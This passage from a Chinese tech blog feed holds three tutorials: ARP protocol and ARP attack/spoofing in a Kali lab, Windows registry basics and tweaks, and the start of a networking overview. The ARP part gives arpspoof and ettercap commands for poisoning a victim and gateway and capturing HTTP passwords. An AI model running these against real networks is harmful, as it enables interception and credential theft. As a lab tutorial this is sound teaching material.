alt=""></p><p>1.10是本机的，1.20是对端主机的，它的type类型是ARPA，是从F0/0发送的</p><p>我们想要清除ARP的话，用<code>clear arp-cache</code>命令</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战16.webp" alt=""></p><p>我们可以手动添加ARP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp 192.168.1.20 cc03.143c.0000 arpa</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战17.webp" alt=""></p><p>也可以手动删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no arp 192.168.1.20 cc03.143c.0000 arpa</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战18.webp" alt=""></p><p>那如果我们手动添加的时候，把MAC地址给改了，即MAC地址和IP地址对应的主机不同，会发生什么</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp 192.168.1.20 cc03.143c.0011 arpa</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战19.webp" alt=""></p><p>那么现在我们ping 192.168.1.20能不能ping通？</p><p>肯定ping不同</p><p>因为我们ARP是在二层交互，二层就靠MAC地址来交互，你给了一个虚假的MAC地址，他是肯定不同的。</p><h2 id="三-ARP欺骗与ARP攻击"><a href="#三-ARP欺骗与ARP攻击" class="headerlink" title="三. ARP欺骗与ARP攻击"></a>三. ARP欺骗与ARP攻击</h2><h3 id="1-ARP攻击"><a href="#1-ARP攻击" class="headerlink" title="1. ARP攻击"></a>1. ARP攻击</h3><p>和ARP欺骗不同，他的目的是让目标机访问不了网</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战20.webp" alt=""></p><p>主机A想要访问公网，他首先第一步，将数据交给自己的出口路由器，他会向网络中发送ARP请求，然后主机B，主机C，和出口路由器都会接收到ARP请求</p><p>正常情况是，当路由器发现这个IP地址是来问自己的时候，他就会把自己的MAC地址发给主机A，形成ARP响应。</p><p>那如果主机C是攻击方，他就会给主机A发送一个携带虚假MAC地址的ARP响应，然后主机A就会记录ARP表。</p><p>假如出口路由器的IP地址是192.168.1.10，那么当主机A接收到ARP响应并记录了虚假的MAC地址，就会出现，ping不通出口路由器，然后他就不发连接外网。</p><h3 id="2-ARP欺骗"><a href="#2-ARP欺骗" class="headerlink" title="2. ARP欺骗"></a>2. ARP欺骗</h3><h4 id="1-欺骗网关"><a href="#1-欺骗网关" class="headerlink" title="(1) 欺骗网关"></a>(1) 欺骗网关</h4><p>就上面说的，我们给了一个虚假的MAC地址，那如果我们给一个真实的MAC地址呢？</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战21.webp" alt=""></p><p>这个时候主机A会将数据发给主机C，然后主机C再发给出口路由器。</p><p>这个过程中，主机C也会发送ARP应答。</p><h4 id="2-欺骗主机"><a href="#2-欺骗主机" class="headerlink" title="(2) 欺骗主机"></a>(2) 欺骗主机</h4><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战22.webp" alt=""></p><p>主机A想要向主机B发送数据，这个时候就和网关没啥关系了。</p><p>然后还是同样的套路，主机C向主机A发送ARP响应，让主机A发送给主机B的数据发给主机C。</p><h3 id="3-防御"><a href="#3-防御" class="headerlink" title="3. 防御"></a>3. 防御</h3><p>我直接把把网关给绑死，你告诉我，这个IP是这个MAC，我不信，我就按我的来。</p><p>比如ARP防火墙。</p><h2 id="四-实施ARP欺骗和ARP攻击"><a href="#四-实施ARP欺骗和ARP攻击" class="headerlink" title="四. 实施ARP欺骗和ARP攻击"></a>四. 实施ARP欺骗和ARP攻击</h2><h3 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h3><ul><li>kali linux</li><li>win10（被攻击）</li></ul><p>我们用的是kali中的arpspoof工具，kali和win10能够上网，能ping通百度就行，并且这两台能够通信</p><p>然后kali配置源，更新，安装就行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战23.webp" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get upgrade</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战24.webp" alt=""></p><p>然后安装工具 dsniff</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install dsniff</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战25.webp" alt=""></p><h3 id="2-ARP攻击模拟"><a href="#2-ARP攻击模拟" class="headerlink" title="2. ARP攻击模拟"></a>2. ARP攻击模拟</h3><p>ARP攻击不仅要搞主机IP，还要搞主机的网关</p><p>win10的IP是 192.168.40.134，网关是 192.168.40.2</p><p>然后确认一下kali的网卡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战26.webp" alt=""></p><p>有一块eth0网卡</p><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.40.134 192.168.40.2</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战27.webp" alt=""></p><p>这个 00:50:56:28:13:28 就是kali的MAC地址</p><p>我们在win10上抓一下包</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战28.webp" alt=""></p><p>可以看到清一色的全是 00:50:56:28:13:28</p><p>这个时候这台win10就无法访问网关了，即无法上外网。</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战29.webp" alt=""><br>我们看看抓包内容</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战30.webp" alt=""><br>看包的内容，看不出啥东西。</p><p>但是我们看看最开始，我们ping的那个抓包，那个是不是就两个ARP啊，这里一堆ARP报文，这极有可能是ARP攻击。</p><h3 id="3-ARP欺骗模拟"><a href="#3-ARP欺骗模拟" class="headerlink" title="3. ARP欺骗模拟"></a>3. ARP欺骗模拟</h3><p>ARP欺骗简单，就有点像中间商，win10的数据先交给kali，然后kali再交给网关。</p><p>我们首先要开启kali的IP转发功能，我们可以命令开启</p><p>我们重新开一个终端，ARP攻击让它继续</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战31.webp" alt=""></p><p>打开后，win10就能上网了</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战32.webp" alt=""></p><p>我们在kali打开wireshark</p><p>我们筛选ip 192.168.40.134</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr == 192.168.40.134</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战33.webp" alt=""></p><p>抓到包了。</p><h3 id="4-ARP欺骗工具"><a href="#4-ARP欺骗工具" class="headerlink" title="4. ARP欺骗工具"></a>4. ARP欺骗工具</h3><p>我们这里再用另外的工具试试</p><p>kali里自带了一个工具叫 ettercap-graphical</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战34.webp" alt=""></p><p>我们打开它</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战35.webp" alt=""></p><p>选择好网卡后点击勾。</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战36.webp" alt=""></p><p>点击这个 hostlist</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战37.webp" alt=""></p><p>找到目的IP</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战38.webp" alt=""></p><p>添加到目标1</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战39.webp" alt=""></p><p>下面就会告诉你添加好了。</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战40.webp" alt=""></p><p>开启ARP毒化</p><p>然后我们打开客户端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tq -i eth0</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战41.webp" alt=""></p><p>我们打开一个http的网页，截取一下密码。</p><p><img src="\media\2023\02\ARP协议原理与ARP攻击欺骗及模拟实战42.webp" alt=""></p><p>注意，这个方法只能整http，有时间会出一篇截取https的文章。</p>]]></content>
      
      
      <categories>
          
          <category> 网络协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>注册表有关知识及其应用、维护和优化</title>
      <link href="/2023/02/16/29/"/>
      <url>/2023/02/16/29/</url>
      
        <content type="html"><![CDATA[<h2 id="一-注册表基础"><a href="#一-注册表基础" class="headerlink" title="一. 注册表基础"></a>一. 注册表基础</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h3><p>注册表是Windows操作系统、硬件设备以及客户应用程序得以正常运行和保存设置的核心“数据库”，也可以说是一个非常巨大的树状分层结构的数据库系统</p><p>注册表记录了用户安装在计算机上的软件和每个程序的相互关联信息，它包括了计算机的硬件配置，包括自动配置的即插即用的设备和已有的各种设备说明、状态属性以及各种状态信息和数据。利用一个功强大的注册表数据库来统一集中地管理系统硬件设施、软件配置等信息，从而方便了管理，增强了系统的稳定性</p><h3 id="2-早期的注册表"><a href="#2-早期的注册表" class="headerlink" title="2. 早期的注册表"></a>2. 早期的注册表</h3><p>早期的注册表是以ini 为扩展名的文本文件的配置文件</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-1.webp" alt=""></p><h3 id="3-Windows-95后的注册表"><a href="#3-Windows-95后的注册表" class="headerlink" title="3. Windows 95后的注册表"></a>3. Windows 95后的注册表</h3><p>自Windows 95操作系统开始，注册表真正成为Windows用户经常接触的内容，并在其后的操作系统中继续沿用</p><h4 id="1-注册表数据库由多个文件组成"><a href="#1-注册表数据库由多个文件组成" class="headerlink" title="(1) 注册表数据库由多个文件组成"></a>(1) 注册表数据库由多个文件组成</h4><p>注册表的文件在：C:\Windows\System32\config</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-2.webp" alt=""></p><h4 id="2-Windows-提供了注册表编辑器，就是我们的命令regedit"><a href="#2-Windows-提供了注册表编辑器，就是我们的命令regedit" class="headerlink" title="(2) Windows 提供了注册表编辑器，就是我们的命令regedit"></a>(2) Windows 提供了注册表编辑器，就是我们的命令regedit</h4><p>我们平时打开注册表是通过regedit命令来打开，其实它也可以通过exe双击直接打开</p><p>注册表管理的目录是：C:\Windows</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-3.webp" alt=""></p><h3 id="4-注册表的结构"><a href="#4-注册表的结构" class="headerlink" title="4. 注册表的结构"></a>4. 注册表的结构</h3><h4 id="1-简单来说"><a href="#1-简单来说" class="headerlink" title="(1) 简单来说"></a>(1) 简单来说</h4><p>我们打开注册表，可以看到他是一个树状结构</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-4.webp" alt=""></p><p>可以看到，它的下面有5个文件夹，我们称之为5棵子树</p><p>我们随便打开一个子树，比如我们打开HKEY_USERS</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-5.webp" alt=""></p><p>可以看见这颗子树下还有一堆文件夹，我们称之为项，每个项在右面有对应的值</p><p>注册表的结构就由“子树”，“项”和“值”这三个组成</p><h4 id="2-子树"><a href="#2-子树" class="headerlink" title="(2) 子树"></a>(2) 子树</h4><p>我们刚才看到它有5棵子树，但是实际上，它就有两颗子树。</p><p>这两棵子树分别是 HKEY_USERS 和 HKEY_LOCAL_MACHINE</p><p>人们为了方便操作，把这两颗子树细分，最后变成了一共5棵子树。</p><p><strong>HKEY_LOCAL_MACHINE：</strong></p><p>它记录关于本地计算机系统的信息，包括硬件和操作系统数据。</p><p><strong>HKEY_USERS：</strong></p><p>它记录关于动态加载的用户配置文件和默认配置文件的信息。</p><p><strong>HKEY_CURRENT_USER：</strong></p><p>它是HKEY_USERS子树，指向 “HKEY_USERS\当前用户的安全ID”<br>包含当前以交互方式登录的用户的用户配置文件。</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-6.webp" alt=""></p><p><strong>HKEY_CURRENT_CONFIG：</strong><br>他是 HKEY_LOCAL_MACHINE 的子树，<br>指向 HKEY LOCAL_MACHINE\SYSTEM\CurentControlSet\Hardware Profiles\Current<br>包含在启动时由本地计算机系统使用的硬件配置文件的相关信息加载的设备驱动程序、显示时要使用的分辨率</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-7.webp" alt=""></p><p>可以看到，这两个是一样的</p><p>HKEY_CLASSES_ROOT：<br>它是 HKEY_CURRENT_USER 的子树<br>包含用于各种OLE技术和文件类关联数据的信息</p><h4 id="3-项"><a href="#3-项" class="headerlink" title="(3) 项"></a>(3) 项</h4><p>可以简单的理解文件夹，项中可以包含项和值</p><h4 id="4-值"><a href="#4-值" class="headerlink" title="(4) 值"></a>(4) 值</h4><p>每一个子树都有对应值，每一个项也有对应值</p><p>每个注册表项或子项都可以包含称为值的数据</p><p>部分值应用于某个用户的信息</p><p>部分值应用于计算机所有用户的信息</p><p>值由三部分组成(值的名称、值类型、值的数据)</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-8.webp" alt=""></p><p>值的类型可以通过新建值看</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-9.webp" alt=""></p><h2 id="二-注册表基本操作"><a href="#二-注册表基本操作" class="headerlink" title="二. 注册表基本操作"></a>二. 注册表基本操作</h2><h3 id="1-创建项"><a href="#1-创建项" class="headerlink" title="1. 创建项"></a>1. 创建项</h3><p>这个简单，直接右击新建项就行了</p><h3 id="2-创建值-有六种类型的值"><a href="#2-创建值-有六种类型的值" class="headerlink" title="2. 创建值(有六种类型的值)"></a>2. 创建值(有六种类型的值)</h3><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-10.webp" alt=""></p><p><strong>字符串值(REG_SZ) ：固定长度的文本字符串</strong></p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-11.webp" alt=""></p><p><strong>二进制值(REG_BINARY) ：原始二进制数据。多数硬件组件信息都以二进制数据存储</strong></p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-12.webp" alt=""></p><p><strong>DWORD值(REG_DWORD) ：数据由4字节长的数表示。设备驱动程序和服务的很多参数都是这种类型</strong></p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-13.webp" alt=""></p><p><strong>QWORD值(REG_QWORD) ：数据由8字节长的数表示</strong></p><p>这个类型没找着</p><p><strong>多字符串值(REG_MULTI_SZ) ：多重字符串。包含列表或多值的值通常为该类型</strong></p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-14.webp" alt=""></p><p>可扩充字符串值(REG EXPANDSZ) ：长度可变的数据串。该数据类型包合在程序或服务使用该数据时解析的变量</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-15.webp" alt=""></p><h3 id="3-修改、删除和重命名值"><a href="#3-修改、删除和重命名值" class="headerlink" title="3. 修改、删除和重命名值"></a>3. 修改、删除和重命名值</h3><p>右键就行</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-16.webp" alt=""></p><h2 id="三-注册表应用"><a href="#三-注册表应用" class="headerlink" title="三. 注册表应用"></a>三. 注册表应用</h2><h3 id="1-案例"><a href="#1-案例" class="headerlink" title="1. 案例"></a>1. 案例</h3><h4 id="1-个性化时间"><a href="#1-个性化时间" class="headerlink" title="(1) 个性化时间"></a>(1) 个性化时间</h4><p>注册表目录：计算机\HKEY_CURRENT_USER\Control Panel\International<br>修改的值：sTimeFormat</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-17.webp" alt=""></p><p>修改后点击确认</p><p>看看结果</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-18.webp" alt=""></p><p>更改生效</p><h4 id="2-欢迎屏幕的显示自定义"><a href="#2-欢迎屏幕的显示自定义" class="headerlink" title="(2) 欢迎屏幕的显示自定义"></a>(2) 欢迎屏幕的显示自定义</h4><p>注册表目录：计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System<br>修改值：legalnoticecaption</p><p>这个legalnoticecaption是标题，下面那个legalnoticetext是文本，也可以改</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-19.webp" alt=""></p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-20.webp" alt=""></p><p>我们注销一下，重新登录试试</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-21.webp" alt=""></p><p>成功！</p><h4 id="3-禁用任务管理器"><a href="#3-禁用任务管理器" class="headerlink" title="(3) 禁用任务管理器"></a>(3) 禁用任务管理器</h4><p>注册表位置：计算机\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System<br>新建DWORD值：DisableTaskMgr<br>值数据：1</p><p>这里要是Policies下没有System项的话，就新建一个</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-22.webp" alt=""></p><p>看看结果</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-23.webp" alt=""></p><p>这样任务管理器就禁用了。</p><p>想要恢复的话把DisableTaskMgr值删了就行</p><h4 id="4-禁用控制面板"><a href="#4-禁用控制面板" class="headerlink" title="(4) 禁用控制面板"></a>(4) 禁用控制面板</h4><p>注册表路径：HKEY_CURRENT_USERISOFTWARE\Microsoft Windows CurrentVersion Policies\Explorer<br>新建DWORD值：NoControlPanel<br>值数据：1</p><p>这里要是Policies下没有Explorer项的话，就新建一个</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-24.webp" alt=""></p><p>看看效果</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-25.webp" alt=""></p><p>这样就打不开控制面板了</p><p>这里注意，先要恢复它的话需要把 Explorer项 删掉才行</p><h4 id="5-删除快捷方式左下角小箭头"><a href="#5-删除快捷方式左下角小箭头" class="headerlink" title="(5) 删除快捷方式左下角小箭头"></a>(5) 删除快捷方式左下角小箭头</h4><p>注册表路径：HKEY_CLASSES_ROOT\Inkfile<br>删除IsShortcut 值</p><p>我这里已经在装系统的时候默认给删了，演示不了</p><h3 id="2-注册表的编辑技巧"><a href="#2-注册表的编辑技巧" class="headerlink" title="2. 注册表的编辑技巧"></a>2. 注册表的编辑技巧</h3><h4 id="1-查找字符串、值或项"><a href="#1-查找字符串、值或项" class="headerlink" title="(1) 查找字符串、值或项"></a>(1) 查找字符串、值或项</h4><p>就是Ctrl + F</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-26.webp" alt=""></p><p>还可以在 子树或项 中寻找 项或子项</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-27.webp" alt=""></p><h4 id="2-打印，导出注册表"><a href="#2-打印，导出注册表" class="headerlink" title="(2) 打印，导出注册表"></a>(2) 打印，导出注册表</h4><p>在上面的文件可以进行整个的操作</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-28.webp" alt=""></p><p>还可以导出子树或项</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-29.webp" alt=""></p><h2 id="三-注册表的维护"><a href="#三-注册表的维护" class="headerlink" title="三. 注册表的维护"></a>三. 注册表的维护</h2><h3 id="1-注册表被破坏后的常见现象"><a href="#1-注册表被破坏后的常见现象" class="headerlink" title="1. 注册表被破坏后的常见现象"></a>1. 注册表被破坏后的常见现象</h3><p>无法启动系统</p><p>无法运行或正常运行合法的应用程序</p><p>找不到启动系统或运行应用程序所需的文件</p><p>没有访问应用程序的权限</p><p>不能正确安装或装入驱动程序</p><p>不能进行网络连接</p><p>注册表条目有错误</p><h3 id="2-注册表被破坏的原因"><a href="#2-注册表被破坏的原因" class="headerlink" title="2. 注册表被破坏的原因"></a>2. 注册表被破坏的原因</h3><p>应用程序错误：在系统中安装过多的软件后，可能会出现彼此之间的冲突</p><p>驱动程序不兼容：安装系统时有很多驱动都是自动安装，容易产生不同硬件驱动程序不兼容情况，建议到官方网站下载对应稳定版驱动进行安装</p><p>硬件问题：主要出现在硬件质量上，比如硬盘或内存质量不过关造成读写错误、超频、CMOS、病毒等</p><p>误操作：误操作是最常见的原因，可能会导致注册表出现错误，严重者造成系统崩溃或无法启动系统</p><h3 id="3-备份注册表"><a href="#3-备份注册表" class="headerlink" title="3. 备份注册表"></a>3. 备份注册表</h3><h4 id="1-直接将注册表数据库文件进行备份"><a href="#1-直接将注册表数据库文件进行备份" class="headerlink" title="(1) 直接将注册表数据库文件进行备份"></a>(1) 直接将注册表数据库文件进行备份</h4><h4 id="2-导出注册表"><a href="#2-导出注册表" class="headerlink" title="(2) 导出注册表"></a>(2) 导出注册表</h4><p>根据我们上面提到的两种导出方法</p><h4 id="3-恢复注册表"><a href="#3-恢复注册表" class="headerlink" title="(3) 恢复注册表"></a>(3) 恢复注册表</h4><p>直接导入就行</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-30.webp" alt=""></p><h4 id="4-锁定和解锁注册表"><a href="#4-锁定和解锁注册表" class="headerlink" title="(4) 锁定和解锁注册表"></a>(4) 锁定和解锁注册表</h4><p>锁定后就不能用regedit进行编辑了，但是可以用第三方软件进行编辑<br>注册表目录：HKEY_CURRENT_USERISOFTWARE\Microsoft Windows CurrentVersion Policies\Explorer\<br>设置值：Disableregistrytools<br>值数据：1表示锁定，0表示解锁</p><p>锁定后就不能用Windows自带的来编辑注册表了，需要用第三方软件将对应的值改回0</p><h2 id="四-注册表优化"><a href="#四-注册表优化" class="headerlink" title="四. 注册表优化"></a>四. 注册表优化</h2><h3 id="1-优化内容"><a href="#1-优化内容" class="headerlink" title="1. 优化内容"></a>1. 优化内容</h3><h4 id="1-清除多余的DLL文件"><a href="#1-清除多余的DLL文件" class="headerlink" title="(1) 清除多余的DLL文件"></a>(1) 清除多余的DLL文件</h4><p>打开注册表编辑器，锁定到 “计算机HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\SharedDLLs” 项，在这<br>个项下存放的是共享的DLL信息，注意看括号里面的数据，它表示共享文件的数目，如果为0，则可将其删除</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-31.webp" alt=""></p><h4 id="2-安装卸载应用程序的垃圾信息"><a href="#2-安装卸载应用程序的垃圾信息" class="headerlink" title="(2) 安装卸载应用程序的垃圾信息"></a>(2) 安装卸载应用程序的垃圾信息</h4><p>打开注册表编辑器，锁定到 “计算机\HKEY_CURRENT_USER\SOFTWARE” 项和 “HKEY_LOCAL_MACHINE\SOFTWARE“ 项，这两个项中包含系统中的应用程序，对于已知的程序是知道的，主要是针对一些未知的程序进行删除和一些已经卸载了的残留</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-32.webp" alt=""></p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-33.webp" alt=""></p><h4 id="3-系统安装时产生的无用信息"><a href="#3-系统安装时产生的无用信息" class="headerlink" title="(3) 系统安装时产生的无用信息"></a>(3) 系统安装时产生的无用信息</h4><h5 id="删除多余时区-必要情况下只保留北京时区"><a href="#删除多余时区-必要情况下只保留北京时区" class="headerlink" title="删除多余时区 (必要情况下只保留北京时区)"></a>删除多余时区 (必要情况下只保留北京时区)</h5><p>锁定到 “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Time Zones” 项</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-34.webp" alt=""></p><p>删之前建议备份一个</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-35.webp" alt=""></p><h5 id="删除多余的键盘布局"><a href="#删除多余的键盘布局" class="headerlink" title="删除多余的键盘布局"></a>删除多余的键盘布局</h5><p>锁定到 “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layouts” 项，下面每一个子项代表一种键盘布局</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-36.webp" alt=""></p><p>我通常保留中文和美国英文这两个</p><p>这里就不演示了，记得删之前先备份，删的时候看好了是啥键盘布局，别手快把要留的删了</p><h5 id="清除多余的语言代码-英语-0409、中文一0804"><a href="#清除多余的语言代码-英语-0409、中文一0804" class="headerlink" title="清除多余的语言代码(英语-0409、中文一0804)"></a>清除多余的语言代码(英语-0409、中文一0804)</h5><p>锁定到 “计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Locale” 项</p><p><img src="\media\2022\12\注册表有关知识及其应用、维护和优化附件-37.webp" alt=""></p><p>这里和上面一样，注意也一样</p>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络多方面概述</title>
      <link href="/2023/02/16/19/"/>
      <url>/2023/02/16/19/</url>
      
        <content type="html"><![CDATA[<h2 id="一-计算机网络的基本概念"><a href="#一-计算机网络的基本概念" class="headerlink" title="一. 计算机网络的基本概念"></a>一. 计算机网络的基本概念</h2><h3 id="1-什么是计算机网络"><a href="#1-什么是计算机网络" class="headerlink" title="1. 什么是计算机网络"></a>1. 什么是计算机网络</h3><p>计算机网络是：由两台或多台计算机通过网络设备进行串联（网络设备通过传输介质串联）所形成的网络</p><p>网络设备有：</p><ul><li><strong>计算机</strong></li><li><strong>路由器</strong></li><li><strong>防火墙</strong></li><li><strong>交换机</strong></li><li><strong>……</strong></li></ul><p>传输介质有：</p><ul><li><strong>双绞线（网线）5类，6类，7类</strong></li><li><strong>光纤</strong></li><li><strong>无线</strong></li></ul><h3 id="2-计算机网络的目的"><a href="#2-计算机网络的目的" class="headerlink" title="2. 计算机网络的目的"></a>2. 计算机网络的目的</h3><p>数据通信</p><p>资源共享</p><p>增加可靠性（有备份）</p><p>提高系统的处理能力（有点类似于CDN）</p><h3 id="3-计算机网络的发展历程"><a href="#3-计算机网络的发展历程" class="headerlink" title="3. 计算机网络的发展历程"></a>3. 计算机网络的发展历程</h3><h4 id="1-第一阶段"><a href="#1-第一阶段" class="headerlink" title="(1) 第一阶段"></a>(1) 第一阶段</h4><p>分组交换网络 —— 阿帕网（ARPnet）</p><p>这是由美国军方提出的，将四台同类型的计算机进行串联，形成了ARPnet</p><p><strong>关键技术就是分组交换</strong></p><h4 id="2-第二阶段"><a href="#2-第二阶段" class="headerlink" title="(2) 第二阶段"></a>(2) 第二阶段</h4><p>时间：近80年代</p><p>标志事件：NSFnet</p><p><strong>关键性技术：TCP/IP协议簇的提出</strong></p><p>在这一阶段中，计算机网络首先是进入到了大学中，形成大学的主干网，将各个大学串联起来。</p><p>之后计算机网络进入商业，由<strong>美国国家科学基金会（NSF）</strong>提出了<strong>NSFnet</strong>。</p><p>由于商业原因，每家厂商都有自己的网络协议，导致不同厂商的设备无法相通，所以提出了TCP/IP技术，可以让不同厂商的计算机进行互通</p><h4 id="3-第三阶段"><a href="#3-第三阶段" class="headerlink" title="(3) 第三阶段"></a>(3) 第三阶段</h4><p>90年代，超文本链接网页（HTML）提出，浏览器出现</p><p>标志性事件：浏览器的出现</p><p>关键性技术：万维网技术（web====www）</p><p>欧洲核子物理中心研究出了WWW技术</p><h2 id="二-计算机网络的常见概念"><a href="#二-计算机网络的常见概念" class="headerlink" title="二. 计算机网络的常见概念"></a>二. 计算机网络的常见概念</h2><h3 id="1-网络协议和标准"><a href="#1-网络协议和标准" class="headerlink" title="1. 网络协议和标准"></a>1. 网络协议和标准</h3><p>只要你在网络中，你就需要去遵循网络中的一些标准，就是网络协议</p><p>协议：规则（计算机网络中通信的对等实体之间交换信息时所需要遵循的规则的集合）</p><p>标准组织：来提出标准的组织</p><ul><li>ISO：国家标准化组织</li><li>ITU：国际电气联盟</li><li>IEEE：电气和电子工程师协会</li><li>……</li></ul><h3 id="2-网络分类"><a href="#2-网络分类" class="headerlink" title="2. 网络分类"></a>2. 网络分类</h3><p>网络经常是根据地域来区分的。</p><p><strong>广域网</strong>：WAN，万维网，外网</p><p>城域网：一个城市的网络</p><p>局域网：LAN，内网</p><h3 id="3-IEEE802局域网标准"><a href="#3-IEEE802局域网标准" class="headerlink" title="3. IEEE802局域网标准"></a>3. 